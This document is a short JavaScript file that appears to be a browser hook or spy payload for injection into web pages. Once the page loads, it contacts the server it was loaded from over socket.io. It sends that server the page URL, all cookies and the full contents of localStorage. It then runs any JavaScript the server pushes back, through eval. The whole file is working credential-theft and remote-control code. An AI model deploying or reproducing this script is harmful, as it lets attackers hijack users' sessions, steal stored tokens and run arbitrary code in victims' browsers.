var scriptEls = document.getElementsByTagName( 'script' );
var thisScriptEl = scriptEls[scriptEls.length - 1];
var scriptPath = thisScriptEl.src;
var SPY_SERVER_PATH = extractHostname(scriptPath);

function extractHostname(url) {
  var hostname;
  //find & remove protocol (http, ftp, etc.) and get hostname

  if (url.indexOf("//") > -1) {
    hostname = url.split('/').slice(0, 3).join('/');
  }
  else {
    hostname = url.split('/').slice(0, 1).join('/');
  }

  return hostname;
}

(function(){
  function loadScript(url, callback){

    var script = document.createElement("script")
    script.type = "text/javascript";

    if (script.readyState){  //IE
      script.onreadystatechange = function(){
        if (script.readyState == "loaded" ||
          script.readyState == "complete"){
          script.onreadystatechange = null;
          callback();
        }
      };
    } else {  //Others
      script.onload = function(){
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
  }

  function getAllLocalStorage() {
    var values = {},
      keys = Object.keys(localStorage),
      i = keys.length;

    while ( i-- ) {
      values[keys[i]] = localStorage.getItem(keys[i]);
    }

    return values;
  }

  function injectSpyScript(){
    loadScript(
      SPY_SERVER_PATH + '/socket.io/socket.io.js',
      function(){
        var socket = io(SPY_SERVER_PATH);

        setTimeout(function() {
          socket.emit('data', {
            sessionId: socket.id,
            url: window.location.href,
            cookies: document.cookie,
            localStorage: getAllLocalStorage(),
          });

        }, 1000);

        socket.on('execute-js', function(data){
          console.log('execute-js', data.code);
          eval(data.code);
        });
      }
    );
  }

  if (document.readyState === "complete" || document.readyState === "loaded") {
    injectSpyScript();
  } else {
    document.addEventListener("DOMContentLoaded", injectSpyScript);
  }
})();